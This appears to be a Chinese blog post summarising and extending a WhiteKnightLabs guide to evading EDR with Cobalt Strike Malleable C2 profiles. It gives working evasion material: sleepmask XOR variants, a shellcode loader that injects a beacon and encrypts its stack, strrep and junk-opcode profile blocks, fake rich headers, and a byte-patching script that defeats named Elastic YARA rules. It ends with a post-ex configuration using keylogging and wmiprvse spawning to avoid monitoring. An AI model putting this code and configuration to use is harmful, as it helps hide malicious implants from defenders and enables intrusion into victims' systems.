# 前言

最近在知识星球"黑客在思考和他的朋友们"看到菊花哥推荐的一篇国外博客，其内容是如何利用CoabltStrike的Profile文件来逃避EDR，讲的十分全面

本篇博客是对国外文章的学习分享，当然我也会作一些额外的补充来读者更加全面地了解和学习文章的内容

原文地址：https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/

在这篇文章中，使用的CobaltStrike版本为4.8，当然现在已经更新到4.9了，文章提到的所有工具都放在此[github](https://github.com/WKL-Sec/Malleable-CS-Profiles)中



# 内存扫描绕过

## 配置sleep_mask

Github有两款针对内存进行扫描的工具，分别是[BeaconEye](https://github.com/CCob/BeaconEye)和[Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons)。通过配置Profile文件的以下选项可以轻松绕过这两款工具

```
Set sleep_mask "true"
```



当启用此选项时， Beacon 在每次 sleep 之前会混淆自己所在的内存区域，并在 sleep 结束后解开混淆，因此上述工具对其检测失效，下图是使用Hunt-Sleeping和BeaconEye对beacon运行时的检测效果

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-05-16-15-26.png)	

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-05-16-16-45.png)	



## 加载artifact_kit启用堆栈欺骗

虽然`sleep_mask`选项能够绕过内存扫描，但是当我们使用ProcessHacker查看该进程的线程堆栈时，可以发现`WaitForSingleObject`函数的顶层调用是一个绝对地址，通常来说合法的程序会引用一个已导出的函数名，而不是引用一个内存地址，这就显得十分的可疑了

![img](利用CS的Profile文件实现免杀/memory_references1.jpg)		



为了解决这类问题，推荐使用artifact_kit的“堆栈欺骗”功能。artifact_kit是集合在arsenal_kit中，你可以通过修改arsenal_kit.config来启用artifact kit以及设置其功能配置，要启用“堆栈欺骗”，则需将artifact_stack_spoof设置为true

![image-20231013163029328](利用CS的Profile文件实现免杀/image-20231013163029328.png)	

![image-20231013163152630](利用CS的Profile文件实现免杀/image-20231013163152630.png)	

以下是对artifact_technique选项值的解释：

- **dist-mailslot/**：通过mailslot为混淆的shellcode提供服务，然后有一个客户端进行读取和解码。
- **dist-peek/**：这是一个绕过技术，来自于mihi的Metasploit关于反病毒逃逸的研究。
- **dist-pipe/**：通过命名管道为混淆的shellcode提供服务，并由一个客户端进行读取和解码。
- **dist-readfile/**：此方法打开当前的artifact文件，跳到shellcode存储的位置，读取并解码它。
- **dist-readfile-v2/**：打开当前的artifact文件，从文件中读取，用payload覆盖所读内容，然后进行解码

​	

arsenal_kit.config配置完后，运行build_arsenal_kit.sh进行编译, 随后会在`dist/artifact`目录下生成对应的cna脚本, 后续需将此脚本导入CobaltStrike

> 注意：此处有个大坑，build_arsenal_kit.sh无法在中文版的linux环境中运行

![image-20231013163758859](利用CS的Profile文件实现免杀/image-20231013163758859.png)



注意：堆栈欺骗功能只能适用于创建exe或dll, 无法适用于生成的shellcode, 它只能通过以下方式创建

- Attacks -> Packages -> Windows Executable
- Attacks -> Packages -> Windows Executable (S)
- Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)



将cna脚本导入后再生成beacon, 可以发现没有留下内存地址引用的痕迹, 这就是“堆栈欺骗”的作用

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-07-15-06-49.jpg)	



## 修改sleepmask_kit

Sleepmask机制通过CobaltStrike的Sleepmask Kit实现，该Kit提供了一套源代码，使用户能够自定义遮掩过程。在默认配置下，Sleepmask Kit提供了基本的异或遮掩，但用户可以根据需要修改这些源代码，以实现更复杂或不同的遮掩算法

作者强调了哪些代码不能被修改，比如不允许修改MASK_SIZE值，因为这是用于指定mask大小的参数，更改可能会导致Beacon无法正常运行

在sleepmask.c有一个sleep_mask函数，该函数通过调用`mask_sections`和`mask_heap`函数来加密Beacon的内存区段和堆内存，而两个函数在common_mask.c中实现

![image-20231018111636772](浅谈CS的sleepmask_kit/image-20231018111636772.png)



mask_sections函数通过遍历`SLEEPMASKP`结构中的区段数组, 对每个区段调用`mask_section`函数来实现加密或解密操作

mask_section函数用于xor加密或解密一个特定的内存区段，它接受三个参数：一个`SLEEPMASKP`指针和两个指定内存区段起始和结束位置的值

```cpp
/* Mask a beacon section
 *   First call will mask
 *   Second call will unmask
 */
void mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
   while (a < b) {
      *(parms->beacon_ptr + a) ^= parms->mask[a % MASK_SIZE];
      a++;
   }

    
/* Mask the beacons sections
 *   First call will mask
 *   Second call will unmask
 */
void mask_sections(SLEEPMASKP * parms) {
   DWORD * index;
   DWORD a, b;

   /* walk our sections and mask them */
   index = parms->sections;
   while (TRUE) {
      a = *index; b = *(index + 1);
      index += 2;
      if (a == 0 && b == 0)
         break;

      mask_section(parms, a, b);
   }
}
```



通过修改mask_section函数的异或加密形式，一般可以绕过绝大多数杀软的检测，前提是mask_section函数可以同时用于加密和解密，下面我介绍三种异或加密的变体形式：

```cpp
// 如下代码每隔一个字节进行异或加密

void mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
    while (a < b) {
        // 只有当 a 是偶数时才执行异或操作，这样可以确保每两个字节进行一次异或操作
        if (a % 2 == 0) {
            *(parms->beacon_ptr + a) ^= parms->mask[a % MASK_SIZE];
        }
        a++;
    }
}
```

```cpp
//根据字节的位置来动态生成密钥

void mask_section(SLEEPMASKP* parms, DWORD a, DWORD b) {
    while (a < b) {
        BYTE dynamic_key = (a * 37) & MASK_SIZE; // simple example of dynamic key generation
        *(parms->beacon_ptr + a) ^= dynamic_key;
        a++;
    }
}
```

```cpp
//异或加密结合自反运算，比如NOT运算

void mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
   while (a < b) {
      *(parms->beacon_ptr + a) ^= parms->mask[a % MASK_SIZE];
      *(parms->beacon_ptr + a) = ~(*(parms->beacon_ptr + a));  // bitwise NOT
      a++;
   }
}
```



## 加密栈内存

当Beacon在目标机器上执行C2发来的命令时，这些命令的执行结果会发送到C2服务器，为了防止被检测到，这些结果字符串在传输过程中会被加密。当beacon处于“休眠”状态时，这些命令通常会以加密的形式存储在堆或栈内存中

比如在传统的shellcode加载器中，shellcode是存储在栈内存中(函数内部或外部的变量中)

![image-20231017160415389](利用CS的Profile文件实现免杀/image-20231017160415389.png)



即便使用WriteProcessMemory将shellcode写入VirtualAlloc申请的堆内存里了，但它仍然存储在栈中

![image-20231017160633225](利用CS的Profile文件实现免杀/image-20231017160633225.png)



该[github](https://github.com/WKL-Sec/StackMask/tree/main)项目为我们提供了加密栈内存的代码，其主要函数是EncryptThread，它从堆中检索XOR密钥，然后使用VirtualQuery函数计算出堆栈的栈底和大小，最后遍历整个堆栈，并使用XOR密钥进行加密

让我们将EncryptThread函数应用在shellcodeloader上，当shellcode执行完毕后，加密存放shellcode的堆栈，

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// 函数：加密线程
DWORD WINAPI EncryptThread(LPVOID lpParameter) {
    // 在堆上保存XOR密钥，这样在堆栈加密过程中它不会改变
    char* key = (char*)malloc(13 * sizeof(char));
    strcpy(key, "myprivatekey");
    int keyLength = strlen(key);

    // 将参数转换为堆栈指针
    unsigned char* rsp = (unsigned char*)lpParameter;

    // 获取存储shellcode的堆栈的地址范围
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(rsp, &mbi, sizeof(mbi));

    // 计算堆栈基址（堆栈底部）及其大小
    unsigned char* stackRegion = mbi.BaseAddress - 8192;
    unsigned char* stackBase = stackRegion + mbi.RegionSize + 8192;
    int stackSize = stackBase - rsp;

    // 打印堆栈信息
    printf("[+] The address of stack region: 0x%p\n", stackRegion);
    printf("[+] The address of stack base: 0x%p\n", stackBase);
    printf("[+] The stack size: %d bytes\n", stackSize);

    // 使用XOR密钥掩码堆栈
    unsigned char* p = (unsigned char*)rsp;
    for (int i = 0; i < stackSize; i++) {
        *(p++) ^= key[i % keyLength];
    }

    printf("[+] Stack is encrypted\n");

    // 释放密钥
    free(key);
}


int main() {
    // 在堆栈上保存一些变量
    unsigned char shellcode[] = "CobaltStrike shellcode";

    // 获取当前进程的句柄
    DWORD pnameid = GetCurrentProcessId();
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);

    // 在远程进程中分配内存并写入shellcode
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);

    // 在远程进程中创建一个新线程来执行shellcode
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    // 关闭进程句柄
    CloseHandle(processHandle);

    getchar();

    // 获取RSP的值，表示堆栈的起始地址
    unsigned char* rsp;
    asm("movq %%rsp, %0;" : "=r" (rsp));
    printf("[+] The address of rsp is %p\n", rsp);

    // 创建一个线程来执行堆栈加密
    HANDLE hThread = CreateThread(NULL, 0, EncryptThread, rsp, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Failed to create thread\n");
        return 1;
    }

    // 暂停等待用户输入
    system("pause");
    return 0;
}

```



以下是堆栈加密前和加密后的对比图：

![image-20231017231817521](利用CS的Profile文件实现免杀/image-20231017231817521.png)	



# 静态签名绕过

## 配置obfuscate

通过配置Profile文件的如下选项，可移除Beacon堆中的绝大部分字符串

```
set obfuscate "true";
```



将Profile文件应用于CobaltStrike后，将生成的Shellcode放入[ShellcodeLoader](https://github.com/WKL-Sec/GregsBestFriend/blob/main/Clang-LLVM/GregsBestFriend.cpp)中并编译成EXE，如下是`obfuscate`选项设置前后的对比图

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-08-18-42-18-1024x155.jpg)

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-08-18-45-25-1024x636.jpg)



虽然设置了`obfuscate`选项，但使用ThreadCheck还是可以检测得到，如下图所示，可以发现msvcrt被识别为"Bad Bytes"

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-06-01-36-33.png)	



因此,让我们稍微修改下profile文件, 以此删除这类可疑的字符串, 但是这并没有多大得帮助, 因为还有其他字符串仍然会在堆中找到

```
strrep "msvcrt.dll" "";
strrep "C:\\Windows\\System32\\msvcrt.dll" "";
```



## 使用Clang++来解决上述问题

由于每个编译器都有其独特的优化策略和特性，使用不同的编译器可以生成具有不同特征的可执行文件。这种独特性可能使得这些文件更难以被安全检测系统识别，从而实现绕过检测

例如，Clang++提供了多种优化标志，可以帮助减小编译后代码的大小，而GCC(G++)则以其高性能优化能力而闻名

以下是在MingW中编译和在Clang++中编译的beacon对比图，可以发现Clang++编译的beacon明显字符串少了许多

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-10-00-33-36.png)	



再次使用ThreatCheck检测Clang++编译的beacon，没有检测到字符串msvcrt.dll

> Clang下载地址：https://github.com/mstorsjo/llvm-mingw/releases

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-06-02-18-56.png)		



## 删除堆中的字符串

尽管我们在Profile文件中启用了obfuscate功能，但是仍然能够在Beacon堆中检测到大量的字符串

<img src="利用CS的Profile文件实现免杀/Screenshot-from-2023-05-09-01-56-03.png" alt="img" style="zoom:67%;" />	



因此我们需对Profle文件进行一些修改，添加以下选项删除上图所见的所有字符串

```
transform-x64 {
    prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
    strrep "This program cannot be run in DOS mode" ""; # Remove this text
    strrep "ReflectiveLoader" "";
    strrep "beacon.x64.dll" "";
    strrep "beacon.dll" ""; # Remove this text
    strrep "msvcrt.dll" "";
    strrep "C:\\Windows\\System32\\msvcrt.dll" "";
    strrep "Stack around the variable" "";
    strrep "was corrupted." "";
    strrep "The variable" "";
    strrep "is being used without being initialized." "";
    strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
    strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
    strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
    strrep "Stack memory was corrupted" "";
    strrep "A local variable was used before it was initialized" "";
    strrep "Stack memory around _alloca was corrupted" "";
    strrep "Unknown Runtime Check Error" "";
    strrep "Unknown Filename" "";
    strrep "Unknown Module Name" "";
    strrep "Run-Time Check Failure" "";
    strrep "Stack corrupted near unknown variable" "";
    strrep "Stack pointer corruption" "";
    strrep "Cast to smaller type causing loss of data" "";
    strrep "Stack memory corruption" "";
    strrep "Local variable used before initialization" "";
    strrep "Stack around" "corrupted";
    strrep "operator" "";
    strrep "operator co_await" "";
    strrep "operator<=>" "";
}
```



## 修改shellcode的前置硬编码

我们可以在shellcode的开头添加一些汇编指令，为了避免在执行beacon时出现奔溃情况，我们必须采用不会影响shellcode执行的垃圾汇编指令(俗称"花指令")。

比如采用一些简单的“0x90”(Nop)指令，或者更好的是，使用如下汇编指令列表的动态组合

```
inc esp
inc eax
dec ebx
inc ebx
dec esp
dec eax
nop
xchg ax,ax
nop dword ptr [eax]
nop word ptr [eax+eax]
nop dword ptr [eax+eax]
nop dword ptr [eax]
nop dword ptr [eax]
```



我们可以使用一个简单的python脚本，来实现对上述汇编指令的随机组合

```python
import random

# Define the byte strings to shuffle
byte_strings = ["40", "41", "42", "6690", "40", "43", "44", "45", "46", "47", "48", "49", "", "4c", "90", "0f1f00", "660f1f0400", "0f1f0400", "0f1f00", "0f1f00", "87db", "87c9", "87d2", "6687db", "6687c9", "6687d2"]

# Shuffle the byte strings
random.shuffle(byte_strings)

# Create a new list to store the formatted bytes
formatted_bytes = []

# Loop through each byte string in the shuffled list
for byte_string in byte_strings:
    # Check if the byte string has more than 2 characters
    if len(byte_string) > 2:
        # Split the byte string into chunks of two characters
        byte_list = [byte_string[i:i+2] for i in range(0, len(byte_string), 2)]
        # Add \x prefix to each byte and join them
        formatted_bytes.append(''.join([f'\\x{byte}' for byte in byte_list]))
    else:
        # Add \x prefix to the single byte
        formatted_bytes.append(f'\\x{byte_string}')
        
# Join the formatted bytes into a single string
formatted_string = ''.join(formatted_bytes)

# Print the formatted byte string
print(formatted_string)
```



将python脚本代码生成的花指令写入我们的Profile文件中

```
transform-x64 {
        ...
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        ...
}
```



再次生成shellcode时，你会发现前面的字节(MZ头前面所有字节)发生了变化

![img](利用CS的Profile文件实现免杀/image-4.png)	



## 修改rich header

在Windows PE文件格式中，`Rich Header`是一个不太为人所知的部分，它位于DOS头和NT头之间。这个头部包含了与编译器和链接器相关的元数据，可以被视为Windows可执行文件构建环境的一个"指纹"

由于Rich Header是一个不会被执行的部分，因此我们可以使用python脚本生成垃圾汇编指令来对其进行填充，python代码如下所示

```py
import random

def generate_junk_assembly(length):
    return ''.join([chr(random.randint(0, 255)) for _ in range(length)])

def generate_rich_header(length):
    rich_header = generate_junk_assembly(length)
    rich_header_hex = ''.join([f"\\x{ord(c):02x}" for c in rich_header])
    return rich_header_hex

#make sure the number of opcodes has to be 4-byte aligned
print(generate_rich_header(100))
```



将生成的花指令复制到Profile文件的Stage块中

```
stage {
    ...
    set rich_header "\x2e\x9a\xad\xf1...";
    ...
}
```

注意：Rich Header 的长度必须是4 字节对齐，否则您将收到以下 OPSEC警告

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-09-02-08-31.png)	



当然，为了使Rich Header看起来更合法，你可以获取真正DLL的Rich Header，以下是获取dll文件RichHeader的python代码：

```python
import pefile
import sys

def extract_rich_header(dll_path):
    try:
        pe = pefile.PE(dll_path)

        # 检查是否存在Rich Header
        if hasattr(pe, 'RICH_HEADER'):
            rich_header_data = pe.get_data(0x80, pe.RICH_HEADER.size)
            return rich_header_data
        else:
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script_name.py <path_to_dll>")
        sys.exit(1)

    dll_path = sys.argv[1]
    rich_header_content = extract_rich_header(dll_path)

    if rich_header_content:
        shellcode = ''.join([f"\\x{byte:02x}" for byte in rich_header_content])
        print(f"Rich Header shellcode: \"{shellcode}\"")
    else:
        print("Failed to extract Rich Header or Rich Header not found.")
```



# YARA规则绕过

## 加载sleepmask_kit

我们面临的最具挑战性的 YARA 规则之一来自[elastic](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar)，规则`Windows_Trojan_CobaltStrike_b54b94ac`使用arsenal kit中的sleepmask kit可以轻松绕过。尽管我们的Profile文件启用了`set sleep_mask "true"`，但是这还不足以绕过检测，因为所执行的混淆程序很容易被检测到

为了使用sleepmask kit，请通过`build.sh`生成的CNA脚本文件导入至CobaltStrike中。以下是该脚本的执行参数，第一个参数是sleepmask的版本号；第二个参数是与Sleep有关的Windows Api；第三个函数建议设置为true，以便屏蔽Beacon内存中的明文字符串；第四个参数为系统调用模式，建议设置为`indirect_randomized`

```
bash build.sh 47 WaitForSingleObject true indirect output/folder/
```

![img](利用CS的Profile文件实现免杀/image-10.png)	



加载生成的CNA后, 将beacon与yara规则进行匹配,可以发现规则`b54b94ac`已被绕过, 但是还有两条规则需要绕过

![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-14-01-14-14-1024x122.png)



## 修改MZ头和PE头

我们先来分析规则`Windows_Trojan_CobaltStrike_1787eef5`，可以清楚发现该规则在匹配MZ头的内容，例如`4D 5A`（MZ头），而我们的shellcode也确实有出现标记的字节

![image-20231014211740172](利用CS的Profile文件实现免杀/image-20231014211740172.png)

![img](利用CS的Profile文件实现免杀/image-6.png)	



幸运的是，可以通过将以下选项适用于Profile文件，使得我们可以更加轻松地修改MZ头，选项值可以是长度为四个字符的任意值	

```
set magic_mz_x64 "OOPS";
```



除了修改MZ头之外，还可以通过以下选项修改PE头，选项值可以是长度为2个字符的任意值

```
set magic_pe "EA";
```



设置此选项后将使beacon不再被检测到 `Windows_Trojan_CobaltStrike_1787eef5`	

![img](利用CS的Profile文件实现免杀/image-5-1024x113.png)



通过查看原始shellcode，我们可以发现MZ头和PE头都被修改成设置的选项值了

<img src="利用CS的Profile文件实现免杀/image-20231015212504671.png" alt="image-20231015212504671" style="zoom:67%;" />		



## 动态调试修改硬编码

接下来让我们绕过最后一个规则`Windows_Trojan_CobaltStrike_f0b627fc`，其对应的匹配字节是：`$beacon_loader_x64 = { 25 FF FF FF 00 3D 41 41 41 00 75 [5-10] 25 FF FF FF 00 3D 42 42 42 00 75 }`

我们可以确认该规则也确实存在于shellcode中

![image-20231015115317084](利用CS的Profile文件实现免杀/image-20231015115317084.png)	



对规则的硬编码进行反汇编，我们得到以下结果：

```
25 FF FF FF 00       and    eax,0xffffff
3D 41 41 41 00       cmp    eax,0x414141
75 ??                jne    <relative offset based on next byte, range could be 5-10 bytes>
25 FF FF FF 00       and    eax,0xffffff
3D 42 42 42 00       cmp    eax,0x424242
75 ??                jne    <relative offset based on next byte>
```



将shellcode放到x64debug去调试，并定位至规则所在地址。在下图可以看到，经过jne指令时，因为ZF位被设置为1，所以不会进行跳转，而ZF位的值是由`cmp eax, 414141`所决定的。简单来说当eax的值为414141时，jne指令就不会发生跳转

![动画](利用CS的Profile文件实现免杀/动画.gif)



我们将指令`and eax,0xFFFFFF`更改为`mov eax, 0x414141`，可以发现jne指令仍然不会发生跳转，这是因为这两条指令的作用几乎是相同的

![动画](利用CS的Profile文件实现免杀/动画-16973589033062.gif)



我们可使用以下python代码来实现字节替换

```python
def replace_bytes(input_filename, output_filename):
    search_bytes      = b"\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00"
    replacement_bytes = b"\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00"
  
    with open(input_filename, "rb") as input_file:
        content = input_file.read()
        modified_content = content.replace(search_bytes, replacement_bytes)
    
    with open(output_filename, "wb") as output_file:
        output_file.write(modified_content)
    
    print(f"Modified content saved to {output_filename}.")

# Example usage
input_filename = "beacon_x64.bin"
output_filename = "output.bin"
replace_bytes(input_filename, output_filename)
```



使用yara扫描新生成的二进制文件，可以发现规则`Windows_Trojan_CobaltStrike_f0b627fc`没有被检测到

![image-20231015170026321](利用CS的Profile文件实现免杀/image-20231015170026321.png)



# 改善post-ex

`post-ex`块是Cobalt Strike Profile文件中的一个配置区段，主要用于控制和配置后渗透（post-exploitation）阶段的行为和特性。从Cobalt Strike的4.5版本开始，`post-ex`块允许用户在具有显式注入选项的情况下，将特定功能注入到现有的进程中。它提供了针对`post-ex DLLs`的一些操作安全（OPSEC）选项，例如在进行屏幕截取、按键记录、凭证抓取或目标扫描等后渗透任务时，可以考虑将功能注入到当前的Beacon进程中

我们采用如下配置来提升CS的后渗透能力：

```
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}
```

为了避免检测，我们需关闭`threadint`和`amsi`，因为这些是主要的内存IOC(Indicator of Compromise，指系统被攻击或被恶意软件感染的迹象)

通常配置使用svchost.exe作为要生成的进程，但因为它曾经是恶意软件和攻击者的热门目标，所以安全工具对svchost.exe的活动加强了监控。一个非常好的替代方案是使用wmiprvse.exe，它是WMI服务的一部分，因为它与系统管理和查询任务有关，可能会产生大量的日志，所以一些监控工具(如Sysmon和其他SIEMs)可能会选择排除或减少对此进程的监控，以避免日志爆炸和性能下降



# 参考链接

- https://codex-7.gitbook.io/codexs-terminal-window/red-team/cobalt-strike/evading-hunt-sleeping-beacons
- https://whiteknightlabs.com/2023/05/02/masking-the-implant-with-stack-encryption/
